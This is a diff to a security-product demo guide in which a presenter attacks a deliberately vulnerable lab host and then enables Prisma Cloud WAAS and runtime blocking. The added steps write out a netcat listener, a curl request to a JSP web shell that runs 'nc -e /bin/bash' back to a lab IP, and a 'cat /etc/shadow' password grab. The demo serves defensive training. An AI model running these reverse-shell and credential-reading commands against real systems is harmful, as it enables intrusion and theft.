@@ -69,6 +69,17 @@ Vulnerable Host and Container in the Radars view after installing the defender d
 3. Either from the Container screen itself, Click the **Defend** button OR or through **Defend > WAAS**, go to the **Host** tab and Enable the WAAS rule.  Make sure you enable the **Host WAAS Rule, not a Container one**.
 4. Show that the WAAS is only in Alert mode for now.
 5. Run the attack 
+    - `bash /tmp/exploit.sh`
+    - Remotely Install packages, install netcat with curl commands
+    - Open 2nd terminal and run `nc -lvnp 9001`
+    - Send the payload to gain a reverse shell 
+```
+curl --output - http://<Vuln App IP Address>/shell.jsp?cmd=nc%20-e%20/bin/bash%2010.0.2.160%209001
+```
+    - Run some commands in the reverse shell terminal.
+7. Discuss what the attacker was able to do.
+    - i.e. Remote Code Execution, run commands like `cat /etc/shadow` to gain passwords.
+    - Gain a reverse shell and run commands directly
 
 ### Show the events
 1. Navigate to **Compute > Monitor > Events > WAAS for hosts** and scroll to bottom.  Should see events for these attacks.  Discuss both.
@@ -79,6 +90,21 @@ Vulnerable Host and Container in the Radars view after installing the defender d
     - Reverse Shell
     - Lateral Movement
 
+### Turn on Defenses in Prisma Cloud
+1. Block Reverse Shell 
+    - Exit the reverse shell in your terminal with **Control + C**
+    - In Prisma Cloud, Navigate to **Compute > Defend > Runtime > Container Policy** and Click the 3 dots to the far right on the rule and **Edit**.  Go to the **Processes** tab and change from Alert to **Prevent**
+    - Rerun nc command from terminal
+    - Reexecute payload command from other teminal.  
+    - This time, you should some long error message in the attacker's terminal and it should be blocked.  Navigate to Prisma Cloud to show event.
+2. REFACTOR & SYNC WITH STEPS 3&4 IN 'BEGIN DEMO' SECTION - Alert on Code Injection & Local File Inclusion
+    - Enable the Host WAAS Rule you created in prep
+    - Re-run the bash exploit script `bash /tmp/exploit.sh`
+    - Show the Events under **Compute > Monitor > Events > WAAS for Hosts**.  If there are mutiple counts, Zoom in on the latest.
+3. Prevent the Code Injection & Local File Inclusion Attacks
+    - Edit the Host WAAS Rule to Prevent
+
 ## Cleanup
 1. Disable Host WAAS rule
-2. Exit SSH sessions and run the `bash destroy-lab.sh` script
+2. Change Runtime Container Policy, Processes from Prevent to Alert
+3. Exit SSH sessions and run the `bash destroy-lab.sh` script
